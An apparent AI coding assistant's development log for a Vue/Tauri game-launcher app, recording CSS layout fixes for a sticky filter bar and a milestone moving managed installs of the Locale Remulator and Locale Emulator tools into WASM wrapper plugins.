  - The settings view (`AppSettings.vue`/`PluginSettings.vue`) needed the same treatment even though it wasn't the thing asked about - `.content` no longer scrolls at all, so without its own scroll container that view would silently overflow the window with no way to reach anything below the fold. Wrapped both in a new `.settings-scroll` div directly in `App.vue` (same `flex: 1; min-height: 0; overflow-y: auto; padding-bottom: var(--space-5)` treatment, not worth a new component for one wrapper div).
  - `bun run build`/`cargo check` both clean. Not visually verified in a running browser/app window this pass - no screenshot/browser-preview tooling available in this environment - so this is a structural CSS change confirmed by build success and layout reasoning, not an eyeballed one.
  - User confirmed it worked, with one fix needed: a horizontal scrollbar had appeared on all three new scroll containers. Added `overflow-x: hidden` alongside `overflow-y: auto` on `.grid`/`.list`/`.settings-scroll` - `overflow-y: auto` alone doesn't imply `overflow-x: hidden`, so any content sizing right at the container's edge (grid gap rounding, themed scrollbar width itself eating into content width) was enough to trigger a second, unwanted horizontal bar. `bun run build`/`cargo check` both clean.
  - **Regression found by the user**: `.grid`'s new `overflow-x: hidden` clipped `GameCard.vue`'s own `.card:hover { transform: scale(1.06) }` at the leftmost/rightmost column - a scaled edge card now got visually cut off at the container's edge instead of overflowing cleanly the way a scaled middle-column card already does into its neighbor's `gap`. The real cause of the horizontal scrollbar was very likely this same transform in the first place (a transformed element's visual overflow does enlarge a scrollable ancestor's scroll region even though it doesn't affect layout), not a static width mismatch.
  - Fix: reverted `.grid`'s `overflow-x: hidden`, replaced with `padding: 0 var(--space-3) var(--space-5)` instead - giving the leftmost/rightmost column the same breathing room a middle column already gets for free from `gap`, so the hover scale never reaches the container's own edge at all. No scrollbar, no clipping, and `GameListRow.vue` (no hover transform of its own) kept its plain `overflow-x: hidden` unchanged, since it never had this failure mode to begin with. `bun run build`/`cargo check` both clean.
- **Reverted the whole scrollbar-relocation attempt, replaced with a pinned filter bar instead.** User tried the change, hit the `GameCard` hover-clipping regression above, and after seeing it decided the underlying complaint (GameFilters scrolling away along with the list, rather than staying visible as a reference point) was better solved differently - a sticky filter bar, not a per-container scrollbar. Reverted `App.vue`/`GameFilters.vue`/`GameGrid.vue`/`GameList.vue` to their state from right before the relocation commit (`git checkout dfe117d -- <4 files>`, the commit closing Milestone 19, immediately prior to the scrollbar work) rather than hand-reconstructing the old CSS from memory - exact and verifiably clean.
  - `App.vue`'s `.content` goes back to being the single scroll container (`overflow-y: auto`), same as originally, but its top padding moved to `0` - GameFilters.vue's own sticky element carries `padding-top: var(--space-5)` instead, so the visual gap above it stays identical whether it's at rest or pinned. A `position: sticky` element's "stuck" position ignores an ancestor's own padding entirely, so leaving that padding on `.content` would have made the gap collapse to flush the moment it actually stuck.
  - `GameFilters.vue`'s `.filters` gained `position: sticky; top: 0; z-index: 1; background: var(--color-base)` (opaque, so scrolled game rows don't show through underneath once pinned) plus a `border-bottom` for a persistent visual seam between the pinned bar and the scrolling content beneath it.
  - The settings view (`AppSettings.vue`/`PluginSettings.vue`) needed its own top-padding wrapper (`.settings-panel`) for the same reason as the earlier attempt's `.settings-scroll` - it has no sticky element of its own to carry that spacing, so `.content`'s dropped top padding needed to land somewhere.
  - Verified via compiled CSS: `.filters[data-v-*]` carries `position:sticky;top:0` plus the background/border, `.content[data-v-*]` compiles with `padding:0 var(--space-6) var(--space-5)`, `.settings-panel[data-v-*]{padding-top:var(--space-5)}`. `bun run build`/`cargo check` both clean.
- **Two visual bugs found by the user once running it.** (1) The `border-bottom` added along with the pinned bar looked wrong - since it was a decorative extra added on my own initiative (not something asked for, just a "nice to have" divider), removed it outright rather than guess at what specifically looked off about it. (2) More substantively: hovering a top-row `GameCard` rendered *over* the pinned filter bar instead of being masked by it - `.filters`'s `z-index: 1` lost to `GameCard.vue`'s own `.card:hover { z-index: 2 }`, and its Teleported-to-`<body>` balloon (`z-index: 100`) lost even worse, since a Teleported element competes at the document-root stacking context, not wherever it's declared in the template. Bumped `.filters` to `z-index: 150` - high enough to clear both, since neither `#app` nor any ancestor between it and `.filters` sets its own `z-index`/`position`/`isolation` to trap `.filters`'s stacking context below that level. Verified via compiled CSS: `.filters[data-v-*]` now has `z-index:150`, no `border-bottom` property left. `bun run build`/`cargo check` both clean.
- **Third visual bug, also found by the user.** After the z-index fix, hovered edge-column `GameCard`s in rows scrolled to sit right under the pinned bar bled sideways past `.content`'s own edge instead of staying contained - asked the user two clarifying questions before touching anything again (was it every row or specifically bar-adjacent ones; was the leak vertical, over the bar itself, or horizontal, off to the side) rather than patch blind a third time, given the last two fixes had each introduced a new regression. Confirmed: bar-adjacent rows specifically, and horizontal.
  - Root cause: `.content`'s `overflow-y: auto` doesn't reliably guarantee `overflow-x` clips too (the CSS spec's computed-value coupling between the two axes isn't something to lean on implicitly, same lesson as the earlier `.grid`/`.list`/`.settings-scroll` horizontal-scrollbar fix a few entries up) - a hovered edge card's `scale(1.06)` was escaping `.content`'s clip boundary sideways. Not fully certain why this specifically presented for bar-adjacent rows rather than uniformly across all rows (couldn't verify in a live browser), but the fix addresses the actual overflow mechanism directly rather than the symptom, so it should hold regardless of the precise trigger.
  - Fix: added `overflow-x: hidden` explicitly to `.content`. Learned from the earlier `.grid`-level version of this exact problem (that one clipped the hover scale itself, since `.grid` had almost no horizontal padding to absorb the overflow) - `.content`'s existing `var(--space-6)` (2rem) padding is already several times more than a 6% card scale ever needs (a few px), so this clips the sideways bleed without reintroducing that regression.
  - Verified via compiled CSS: `.content[data-v-*]` now has `overflow-x:hidden` alongside its existing `overflow-y:auto` and padding. `bun run build`/`cargo check` both clean. Not visually re-verified in a running app - no browser/screenshot tooling available in this environment for any of this pinned-bar work, flagged honestly rather than claimed as confirmed.
- **Fourth visual bug, this time reported with an actual screenshot rather than only a text description** - the search input visibly stopped well short of the row's full width (a GameCard's diagonal-stripe frame below it, in the same crop, extended edge-to-edge while the search box didn't), even though `.search{flex:1}` inside `.search-row{display:flex}` should in principle stretch it to fill the remaining row width next to `.view-toggle-button`.
  - Applied the standard, well-known fix for exactly this symptom rather than guess at something more exotic: an `<input>` (like other form controls) has a browser-default `min-width: auto` inside a flex row, based on its own intrinsic content size - this can silently override `flex: 1`'s attempt to fill available space, since `flex-basis: 0%` only affects how *extra* space is distributed, not the item's minimum floor. Added `min-width: 0` to `.search` to remove that floor entirely.
  - Also added `width: 100%` to `.filters` itself as a defensive guard (harmless if already redundant) against any unexpected shrink-to-fit sizing, since a screenshot showing the *entire* filter bar (not just the search input specifically) narrower than the grid below made it worth ruling out at the same time rather than fixing the input in isolation and re-testing separately.
  - Verified via compiled CSS: `.filters[data-v-*]` now has `width:100%`, `.search[data-v-*]` now has `min-width:0` alongside its existing `flex:1`. `bun run build`/`cargo check` both clean. Still not visually re-verified live - this is the first bug in this whole pinned-bar saga diagnosed from an actual screenshot rather than a text description alone, which should make it a more confident fix than the earlier three, but confirmation is still pending from the user.
- **`min-width: 0` didn't fix it - user gave the actual structural fix directly**: move the horizontal padding that had been living on `App.vue`'s `.content` down onto `GameGrid.vue`'s `.grid`/`GameList.vue`'s `.list` instead, so `GameFilters.vue`'s `.filters` (which never had its own horizontal padding, only inheriting inset from `.content`) spans `.content`'s *full* width rather than the same inset the grid/list get. Implemented exactly as directed rather than re-diagnosing further, given the previous two self-directed guesses (`overflow-x:hidden` + edge padding, then `min-width:0`) hadn't resolved it.
  - `.content`'s padding: `0 var(--space-6) var(--space-5)` → `0 0 var(--space-5)` - horizontal dropped entirely, bottom (scroll-end breathing room) kept since both views want it regardless of which child now supplies left/right.
  - `.grid` (`GameGrid.vue`) and `.list` (`GameList.vue`) each gained `padding: 0 var(--space-6)` - carrying their own left/right inset now, including the buffer room for `GameCard`'s hover `scale(1.06)` that used to come from `.content`'s padding (`.content`'s `overflow-x: hidden` stays as a safety net, but the actual bleed-prevention buffer lives in `.grid`'s own padding now).
  - The settings view (`AppSettings.vue`/`PluginSettings.vue`) needed the same restoration - its `.settings-panel` wrapper gained the full `padding: var(--space-5) var(--space-6) 0` (previously just `padding-top`, relying on `.content` for the rest) so it doesn't go edge-to-edge as an unintended side effect of a fix that was only supposed to target the library view.
  - Verified via compiled CSS: `.content[data-v-*]{...padding:0 0 var(--space-5)}`, `.grid[data-v-*]{...padding:0 var(--space-6)}`, `.list[data-v-*]{...padding:0 var(--space-6)}`, `.settings-panel[data-v-*]{padding:var(--space-5) var(--space-6) 0}`, `.filters[data-v-*]` unchanged (still no horizontal padding of its own, now correctly spanning the full un-padded `.content` width). `bun run build`/`cargo check` both clean.
- **Confirmed fixed - user asked one more polish step**: with `.filters` now genuinely spanning `.content`'s full width, add matching `var(--space-6)` horizontal padding to `.filters` itself too, so its *content* (the search input/tags) lines up visually with the grid/list below rather than sitting flush against the edges the grid/list are inset from. Replaced `.filters`' `padding-top: var(--space-5)` with `padding: var(--space-5) var(--space-6) 0` - safe with `width: 100%` since the project's global `*{box-sizing:border-box}` reset means padding doesn't add to that width. Verified via compiled CSS: `.filters[data-v-*]` now carries the full 3-value padding. `bun run build`/`cargo check` both clean.

**Fixed a genuinely separate balloon-placement bug the pinned filter bar exposed, plus a bottom-padding polish request.** `useBalloonAnchor.ts`'s "above vs below" decision (`rect.top < MIN_SPACE_ABOVE`, a hardcoded `60px`) assumed the visible area's own top edge was the window's actual `y=0` - true before the filter bar existed, but no longer, since a top-row card scrolled to sit right under the now-pinned bar could still get placed "above," rendering (partially) behind the bar instead of flipping "below" it. The user specifically asked for this to be a real calculation against the bar's actual height, not another magic-number guess.
- Gave `GameFilters.vue`'s `.filters` a dedicated `data-scroll-header` attribute - deliberately not reusing the `.filters` class name itself for this cross-component lookup, since that's a presentational hook that could change independently of "where does the pinned header end" as a concept. `useBalloonAnchor.ts` (used only by `GameCard.vue` now, since `BrickBlockGameCard.vue`'s use was removed along with the rest of Milestone 19's component-swap deletion) queries `document.querySelector('[data-scroll-header]')?.getBoundingClientRect().bottom` at hover time, falling back to `0` if absent (Big Picture/no filter bar present).
- Changed the placement check from `rect.top < MIN_SPACE_ABOVE` to `rect.top - visibleTop < MIN_SPACE_ABOVE` - now measuring the card's clearance from the *real* visible-area boundary (the bar's actual current height, which varies depending on whether the tag-filter row is present) rather than assuming it's always exactly `60px` from the window's top.
- Didn't add a post-render vertical remeasurement/correction pass (unlike the existing horizontal clamp, which does measure the balloon's real `offsetWidth` after mount) - the `MIN_SPACE_ABOVE` margin already accounts for typical balloon height as an estimate, and flipping placement *after* the balloon has already rendered "above" would risk a visible jump; kept scope to the actual reported bug (the boundary reference point being wrong), not a general balloon-height-vs-viewport robustness pass nobody asked for.
- Filter bar bottom padding: added `var(--space-3)` as `.filters`' own bottom padding (was `0`, relying entirely on the external `margin-bottom` for spacing) - purely visual breathing room inside the pinned bar's own background before its content ends, distinct from the gap between the bar and the grid/list below it.
- Verified via compiled CSS: `.filters[data-v-*]` now has `padding:var(--space-5) var(--space-6) var(--space-3)`. `bun run build`/`cargo check` both clean. Not visually re-verified live (no browser tooling available in this environment) - flagged same as every other pinned-bar change this session.

## Milestone 10 — LR/LE Managed Install + WASM Migration
Two LR/LE-focused workstreams combined into one milestone rather than spread across a later separate pass, since both touch the same two wrappers.

**Managed install.** Both wrappers currently require the user to manually download a zip from GitHub, extract it themselves, and paste the resulting `LRProc.exe`/`LEProc.exe` path into Settings (see Milestone 7) - true auto-detection isn't possible since neither leaves a discoverable registry footprint at an arbitrary user-chosen extraction path. This solves that a different way: have the app own the extraction location instead of guessing where the user put it. Distinct from the earlier "don't auto-run a third-party installer" decision for `LRInstaller.exe` - this downloads a portable zip and extracts it ourselves, no elevation or system install involved.
- Rust command to fetch the latest release asset download URL from each project's GitHub Releases API (`InWILL/Locale_Remulator`, `xupefei/Locale-Emulator`) via `reqwest` — new `wrapper_installer.rs`, `latest_locale_remulator_download_url`/`latest_locale_emulator_download_url` hit `GET /repos/{owner}/{repo}/releases/latest` and pick the first `.zip` asset (confirmed against real releases that both projects ship exactly one zip per release, no per-arch variants to disambiguate). Needed an explicit `User-Agent` header - GitHub's API rejects requests without one. Tested with real `#[test]`s hitting the actual GitHub API (not mocked), both pass
- Download + zip extraction into an app-data-managed directory (`<app data>/wrappers/<wrapper_id>/`) — new `zip_install.rs` module shared with `wasm_plugin_installer.rs` (refactored to use it too, rather than duplicating the download-extract-atomic-rename shape now that there were two real call sites). Split into three steps (`download_bytes`, `extract_zip`, `replace_dir`) rather than one all-in-one function, since `wasm_plugin_installer.rs` needs the raw bytes in hand for its SHA256 check before ever extracting anything. A real end-to-end `#[test]` (actual download against Locale Remulator's real latest release, not a mocked zip) caught a genuine bug immediately: the assumption that the zip's contents sat flat at its root was wrong - LR's real release zip wraps everything in a `Locale_Remulator.1.6.0/` folder matching the archive name, so `LRProc.exe` ended up one level deeper than expected. Fixed with `zip_install::unwrap_single_subdir` (if the extracted staging dir contains exactly one entry and it's a directory, treat that as the real content root) - added to the shared module since `wasm_plugin_installer.rs` would hit the identical bug for any real third-party bundle built by zipping a folder the normal OS-GUI way, not just for wrapper installs. `install_wrapper_to` (the actual download+extract logic) was kept `AppHandle`-free specifically so this could be a real test rather than a compiles-clean check, mirroring the `wasm_plugin_runtime.rs`/`instantiate_from_paths` pattern from Milestone 8
- Auto-fill wrapper paths + "Install" button, done together since one has no way to be exercised without the other. `appSettings.ts` gained `installLocaleRemulator`/`installLocaleEmulator` actions: fetch the latest release URL, call `install_wrapper`, then `setLocaleRemulatorPath`/`setLocaleEmulatorPath` with `${dir}\\LRProc.exe`/`${dir}\\LEProc.exe` appended - success/failure reported via `useToastStore` rather than the local error patterns used elsewhere, matching how `library.ts` already reports its own async action errors. `AppSettings.vue` gained an "Install" button next to the existing "Download" link-out button for each wrapper (both stay available - manual download/paste still works for anyone who'd rather not trust the managed flow), disabled with an "Installing..." label while in flight
- Real testing after the above surfaced two more genuine gaps, both fixed:
  - Neither release zip ships `LRConfig.xml`/`LEConfig.xml` - confirmed via `unzip -l` on real downloads, both projects only generate them when their own `LREditor.exe`/`LEGUI.exe` first runs, which managed install deliberately never does. Since these files are purely local round-trip data our own code writes and reads back (never anything LR/LE's "official" defaults need to match), `wrapper_installer.rs` now seeds a minimal default profile pair (`seed_default_config_if_missing`, self-generated GUIDs via the `uuid` crate) if no config already exists, never clobbering a real one
  - Seeding the config alone still wasn't enough for Locale Emulator - a real end-to-end test (seeded GUID, a real installed game) showed `LEProc.exe` failing immediately with `FileNotFoundException: Could not load ... 'LECommonLibrary, Version=0.0.0.0, ...'`, a versionless strong-name load - the standard signature of a GAC-resolved assembly. Confirmed `LECommonLibrary.dll` is never shipped in any LE release zip (checked v2.4.0.0 through current v2.5.0.1) and isn't in the separate `Locale-Emulator-Core` repo either (that one only covers the native `Loader`/`LoaderDll`/`LocaleEmulator` hook libs, already present). Only `LEInstaller.exe` provides it, by GAC-registering a copy during install. First attempt extracted the DLL directly out of `LEInstaller.exe`'s embedded .NET resources via PowerShell reflection and dropped it next to `LEProc.exe` as a loose file (relying on .NET's same-directory assembly probing, which resolves before the GAC) - this worked end-to-end, but repackaging a resource the installer never exposes as a standalone artifact raised a licensing question with no clean answer, so it was replaced with `run_wrapper_installer`, which just launches the real, unmodified `LRInstaller.exe`/`LEInstaller.exe` and lets its window show in front of the user, same as if they'd downloaded and run it manually. LR's `LRProc.exe` needed no equivalent fix on its own (confirmed working standalone via a direct CLI test before LE's bug was even found - `LRInstaller.exe` only registers an optional right-click context-menu extension) but is run through the same command anyway, for one consistent install story across both wrappers rather than two different ones
  - Also added an explicit `.current_dir(...)` (LR/LE's own install folder) to both `launch_via_locale_remulator`/`launch_via_locale_emulator`'s `Command::spawn()` calls while investigating, since LRProc/LEProc resolve their config XML relative to their own directory rather than the caller's cwd - not confirmed as the actual cause of anything (a direct CLI test worked without it too), but explicit is safer than relying on inheriting whatever cwd the host app happens to have
- Merged the two per-wrapper "Install" buttons into one `installWrappers()` action/button (`AppSettings.vue`) once both were using the same download-extract-then-run-installer shape - most users setting up either wrapper want both. The per-wrapper path fields and manual "Download" fallback links stay as they were
- The initial merge still popped both installer windows up nearly simultaneously despite calling the two installs sequentially in JS - `run_wrapper_installer` used `Command::spawn()`, which returns as soon as the process *starts*, not when the user finishes with it, so the `await` in `installWrappers()` wasn't actually waiting for anything meaningful. Fixed by switching to `Command::status()` (blocks until the child exits) run inside `tauri::async_runtime::spawn_blocking` so it doesn't stall the async runtime - now each installer's window has to be closed before the next one opens. Reordered to run LE first (the one that actually needs its installer for `LECommonLibrary.dll`'s GAC registration) then LR, and split the single try/catch into one per wrapper so a failure in either is toasted independently and doesn't stop the other from being attempted
- With the managed install flow fully working, the manual path textbox + "Download" link-out button in `AppSettings.vue` stopped earning their keep - removed both, along with `setLocaleRemulatorPath`/`setLocaleEmulatorPath`/`wrapperPathValid` from the store's public surface (kept as internal helpers). Replaced with a plain read-only Installed/Not installed line per wrapper next to the single "Install Compatibility Wrappers" button
- Two follow-up reports after that landed, both real:
  - `EditGameModal`'s wrapper-profile dropdown didn't pick up new GUIDs right after a reinstall - the exact same staleness bug as `localeRemulatorFound`/`localeEmulatorFound` (a value-keyed `watch` on a path that no longer changes between installs), just a second, independent copy of the pattern that had been living in `EditGameModal.vue` as local `lrProfiles`/`leProfiles` refs. Fixed the same way: moved `lrProfiles`/`leProfiles` into the store, refreshed by the same `refreshWrapperStatus()` call (now also lists both wrappers' profiles alongside the found/not-found check) rather than a per-component watch. `EditGameModal.vue` now just reads `appSettings.lrProfiles`/`leProfiles` directly - one shared, always-current copy instead of every modal instance keeping its own possibly-stale one
  - Checked whether `run_wrapper_installer` running the real `LRInstaller.exe`/`LEInstaller.exe` makes `seed_default_config_if_missing`'s self-generated default profile redundant, since the assumption was the installer might now be creating the config itself - it doesn't. Confirmed by reading the live `LRConfig.xml`/`LEConfig.xml` after a real install: still exactly the app's own seeded template, untouched by the installer windows (consistent with `LRInstaller.exe` only registering a shell context-menu extension and `LEInstaller.exe` only GAC-registering `LECommonLibrary.dll` - neither is `LREditor.exe`/`LEGUI.exe`, the actual profile editors). Seeding stays as-is; it's also already non-destructive by construction (`seed_default_config_if_missing` only ever writes when no config file exists yet, never overwriting a real one)
- That surfaced a real staleness bug: the found/not-found status was previously a local `ref` in `AppSettings.vue`, recomputed by a `watch` keyed on `appSettings.localeRemulatorPath`/`localeEmulatorPath` changing. `install_wrapper` always resolves to the same deterministic managed-directory path, though, so a *reinstall* never actually changes that ref's value - Vue's watcher never re-fires, and the status silently goes stale even though the file on disk just changed. Fixed by moving the check into the store itself (`localeRemulatorFound`/`localeEmulatorFound` refs, `refreshWrapperStatus()`) and calling it explicitly - once on `init()`, and again in `installWrappers()`'s `finally` block - rather than relying on a value-change watch to notice a fact that isn't reflected in the value at all
- Integrity check before extracting: neither project's GitHub releases carry a published checksum (confirmed against the real API response - the `digest` field GitHub auto-computes for some uploads is `null` for both repos' assets), so there's no external hash to verify against the way `wasm_plugin_installer.rs`'s `expected_sha256` does for user-pasted plugin URLs. What the release API does give is the asset's byte `size`, which is a real signal against a truncated/corrupted download (not against tampering - HTTPS to github.com already covers that, and there's no untrusted third-party source in this flow to defend against the way there is for arbitrary plugin URLs). `latest_release_zip_asset` (renamed from `latest_release_zip_url`) now returns `{ url, size }` instead of a bare URL string; `install_wrapper_to`/`install_wrapper` take an `expected_size: Option<u64>` and reject the install before ever extracting if the downloaded byte count doesn't match. `appSettings.ts` threads the size through from the release-info fetch to the install call. Verified with a real test (`rejects_a_download_that_does_not_match_the_expected_size`) that deliberately passes `asset.size + 1` against a real download and asserts both that the install errors and that nothing gets extracted to `final_dir`

**WASM migration.** Moved here from Milestone 9 - makes more sense running alongside the managed-install work than as a separate later pass, since both are LR/LE-focused. Unlike Steam/GOG/Epic, LR/LE weren't `SourcePlugin`s - they were special-cased directly in `library.ts`'s `launchGame()` via `games.locale_wrapper`/`locale_profile_guid`, not modeled as any `PluginBase` kind at all. Real design work, not just a port.
- New `wrapper` plugin kind, the first one built for something other than a source of games. WIT: `wrapper-plugin` interface (`list-profiles`/`launch`), reusing the existing `host` import - no new host primitives needed, `read-file`/`spawn-process` already cover what LR/LE's launch logic needs. Unlike Steam/GOG (auto-detected via the registry, no configuration needed), LR/LE are portable installs with no discoverable location, so `list-profiles`/`launch` both take the wrapper's own exe path (`proc-path`) as an explicit argument rather than trying to push path storage into the guest - the host (`appSettings.ts`) already owns that path from the managed-install flow, no reason to duplicate it
  - `wasm_plugins.rs` needed a second `bindgen!` invocation for the new `wrapper-plugin-world` alongside the existing `source-plugin-world` one. First attempt tried sharing the generated `host` module between the two via bindgen's `with` mapping (avoiding a second copy of the host types) - this doesn't work here because bindgen only generates record types a world's exports actually reference, and `source-plugin-world` never references `locale-profile` (only `wrapper-plugin-world` does), so the shared module ended up missing the type wrapper-plugin needed. Settled on two fully independent bindgen invocations instead; since the `host` interface's own functions never take `game-entry`/`locale-profile` as parameters, the two generated `Host` traits are structurally identical regardless, so `PluginHostState` now has its actual logic in private `do_*` inherent methods with two thin trait impls delegating to them - one copy of the logic, two trait bindings
  - Selection semantics: multi-enable like `source`/`metadata`, not exclusive like `theme`/`controller` - a user can have both LR and LE plugins enabled at once (`EditGameModal`'s dropdown already merged profiles from both before this migration)
- Ported `locale_remulator.rs`/`locale_emulator.rs`'s `list_profiles`/`launch` logic into two new sibling repos, `locale-remulator-wasm-plugin`/`locale-emulator-wasm-plugin` (plugin ids `locale-remulator-wasm`/`locale-emulator-wasm`) - same "real separate repo, not living inside the host app" reasoning as `steam-source-wasm-plugin`/`gog-source-wasm-plugin`. XML parsing via `roxmltree` (already a host-side dependency, compiles fine to `wasm32-wasip1` with no changes needed, same as `keyvalues-parser` did for the Steam port). Verified end-to-end against the real installed `LRProc.exe`/`LEProc.exe` and a real test game via a temporary `#[test]` in `wasm_plugin_runtime.rs` (removed after confirming, not committed) - both plugins correctly listed the real seeded profiles and successfully launched the game through both wrappers, matching the manual CLI verification from earlier in this milestone
- Wired the `wrapper` kind through the same pipes every other kind uses: `manifest.ts`'s `PluginKind` union, `loader.ts`'s WASM-manifest filtering (previously hardcoded to only allow `"source"`) and a `createWasmWrapperPlugin` factory, a new `wrapperPlugins.ts` store (mirrors `metadataProviders.ts`'s multi-enable shape, plus a `profiles` list flattened across every enabled plugin and a `launch(pluginId, guid, executablePath)` action), and a new "Wrapper" tab in `PluginSettings.vue`. `procPathFor()` maps the two known wrapper plugin ids to `appSettings.ts`'s existing `localeRemulatorPath`/`localeEmulatorPath` fields rather than building a fully generic per-plugin path-storage mechanism for a set of exactly two plugins
- `games.locale_wrapper` used to store the literal `"lr"`/`"le"` - now stores a wrapper plugin id. Migration v8 rewrites existing rows (`"lr"` → `"locale-remulator-wasm"`, `"le"` → `"locale-emulator-wasm"`) so already-configured per-game wrapper selections keep working after the switch. Since LR/LE launching was always-on before this migration (no enable/disable toggle existed), `wrapperPluginStore` defaults both new plugin ids to enabled (`DEFAULT_WRAPPER_IDS`, same pattern as `metadataProviders.ts`'s `DEFAULT_PROVIDER_IDS`) rather than leaving already-migrated games pointing at a wrapper plugin the user would otherwise have to know to go enable
- `library.ts`'s `launchGame()` lost its hardcoded `if (locale_wrapper === "lr") ... else ...` branch entirely, replaced by one `wrapperPlugins.launch(game.locale_wrapper, ...)` call - same simplification Steam/GOG's migration gave `plugins.ts`'s scan dispatch
- Built-in `locale_remulator.rs`/`locale_emulator.rs` retired the same way `steam.rs` was: `locale_emulator.rs` deleted outright (both its exports fully replaced), `locale_remulator.rs` trimmed to just `wrapper_path_exists` (still needed - shared by both wrappers' Found/Not-found status check, unrelated to which plugin does the actual launching)
- Two staleness-class bugs (same shape as Milestone 10's earlier `localeRemulatorFound`/`lrProfiles` fixes) had to be headed off proactively rather than found after the fact this time: `wrapperPluginStore.profiles` needs an explicit refresh after `installWrappers()` completes, same reasoning as `appSettings.refreshWrapperStatus()` - a reinstall can change `LRConfig.xml`/`LEConfig.xml`'s GUIDs without the underlying path value ever changing. Rather than having `appSettings.ts` reach into `wrapperPlugins.ts` (which already depends on `appSettings.ts` for `procPathFor`, so that direction would be circular), `AppSettings.vue`'s install button handler calls both stores' refreshes itself
- Real bug from real testing (user built the app and checked Settings): both wrapper plugins showed up under the Source tab too, and Steam (WASM)/GOG (WASM) leaked into the new Wrapper tab. `loader.ts`'s `getInstalledWasmManifests` refactor (adding `wrapper` alongside `source` to `WASM_SUPPORTED_KINDS`) accidentally filtered installed WASM manifests by "is this kind WASM-supported at all" instead of "does this kind match what was actually requested" - `.filter((m) => WASM_SUPPORTED_KINDS.includes(m.kind))` needed to be `.filter((m) => kind ? m.kind === kind : WASM_SUPPORTED_KINDS.includes(m.kind))`. Also renamed `locale_remulator.rs` → `wrapper_paths.rs` (flagged by the same real-testing pass as confusing - the file had already been trimmed down to just the shared `wrapper_path_exists` check, nothing LR-specific left in it)
- Moved the managed-install UI from one combined button in `AppSettings.vue` (`installWrappers()`, download+run-installer for both LR and LE together) to each wrapper plugin's own `settingsComponent` in the Wrapper tab - now that LR/LE are real plugins, they get the same per-plugin settings-UI slot IGDB's API-key form already uses, rather than a special-cased global settings section. `appSettings.ts`'s `installLocaleRemulator`/`installLocaleEmulator` split their shared `installingWrappers` flag into independent `installingLocaleRemulator`/`installingLocaleEmulator` ones and now own their own try/catch/toast directly (previously that lived one level up in `installWrappers`, which is now deleted - no longer needed once installing became two independent user-triggered actions instead of one sequenced pair). New `WrapperInstallStatus.vue` (Found/Not-found status + Install button, parameterized by a `wrapperId` prop) is pre-bound to each of the two known wrapper plugin ids via `defineComponent`/`h()` in `loader.ts`'s `createWasmWrapperPlugin`, since `settingsComponent` is rendered with no props (`<component :is="..." />`) - same "exactly two wrapper plugins, hardcode the pairing" pragmatism as `wrapperPlugins.ts`'s `procPathFor`. `AppSettings.vue` now only has the Big Picture auto-launch checkbox left
- **Full detachment follow-up.** After the above, `wrapper_installer.rs` (download/extract/config-seed/run-installer) and `wrapper_paths.rs` (`wrapper_path_exists`) still lived host-side - real per-integration logic (GitHub URLs, `LRConfig.xml`/`LEConfig.xml`-shaped defaults) in the exact "bespoke Rust module per integration" shape the WIT `host` interface's own doc comment already rejects for source plugins (`steam.rs` was fully deleted once ported; this hadn't gotten the same treatment). Closed the gap by expanding the host capability surface rather than accepting the asymmetry:
  - New `host` functions: `write-file`, `remove-dir`, `run-and-wait` (blocking spawn, for a visible installer window), `download-bytes` (binary - `http-get` returns `string`, unusable for a zip), `extract-zip`/`unwrap-single-subdir`/`replace-dir` (thin WIT wrappers around the existing `zip_install.rs` functions - zip *parsing* stays host-side and shared across every plugin doing a zip install, rather than compiling the `zip` crate into every guest; only the *orchestration* - which URL, what filename, what installer to run - moves to the plugin, which is the part that was actually LR/LE-specific), and `plugin-dir` (a plugin's own writable directory under `<app data>/wasm-plugins/<id>/`)
  - `wrapper-plugin` interface gained `install()`/`is-installed()` exports and dropped `proc-path` entirely from `list-profiles`/`launch` - since `install()` always installs to (and every other export always resolves) the same deterministic `plugin-dir()/install/` location, there's nothing left for the host to own or pass in. `PluginHostState` gained a `plugin_dir: PathBuf` field (threaded in from `wasm_plugin_runtime.rs`'s already-known instantiation path) to back `plugin-dir()`
  - Both plugin repos rewritten to own their full lifecycle: GitHub release lookup + JSON parsing (`serde_json`, compiles to `wasm32-wasip1` with no changes) and GUID generation (`uuid` v4 - needed `getrandom`'s WASI support, also just worked) moved from host Rust into the guest, alongside the existing XML profile parsing
  - `do_http_get`/`do_download_bytes` needed a `User-Agent` header added (previously only `wrapper_installer.rs`'s own dedicated reqwest client set one) - GitHub's API rejects requests without one, and the guest has no way to set custom headers itself through `http-get`'s plain-URL signature
  - Verified for real, not just compiled: real end-to-end `#[test]`s (temporary, not committed) drove each plugin's actual `install()` through a real GitHub fetch, download, extract, and `LRInstaller.exe`/`LEInstaller.exe` launch - since `run-and-wait` blocks until the window closes, each test run was paired with a polling loop that waited for the installer process to appear then force-closed it (mirroring a user closing the window), unblocking the test. This caught a real regression before it shipped: `do_run_and_wait` checked the child's exit status and treated a non-zero one as failure, which is exactly the bug already fixed once before in this same milestone (LR/LE's installer windows aren't real wizards - exit code isn't a meaningful success signal, only whether the process could be spawned at all is). Fixed by dropping the status check entirely, matching the original `run_wrapper_installer`'s behavior. After the fix, both plugins passed real installs end to end: GitHub fetch → download → size check → extract → config seed → installer window → real profiles → real game launch
  - `wrapper_installer.rs` and `wrapper_paths.rs` deleted from the host app entirely; `uuid` and `roxmltree` dropped from the host's own `Cargo.toml` (both now guest-only dependencies). `appSettings.ts` lost every wrapper-related field (`localeRemulatorPath`/`localeEmulatorPath`/`*Found`/`installing*`/`install*`) - down to just the Big Picture auto-launch setting. `wrapperPlugins.ts` lost `procPathFor()` entirely. `loader.ts`'s `createWasmWrapperPlugin` now builds a generic `settingsComponent` bound to the specific plugin instance instead of a hardcoded per-id lookup - any future wrapper plugin gets an Install button for free, no host-side wiring needed. The now-obsolete host-managed `<app data>/wrappers/` directory and orphaned `locale_remulator_path`/`locale_emulator_path` settings rows were cleaned up too
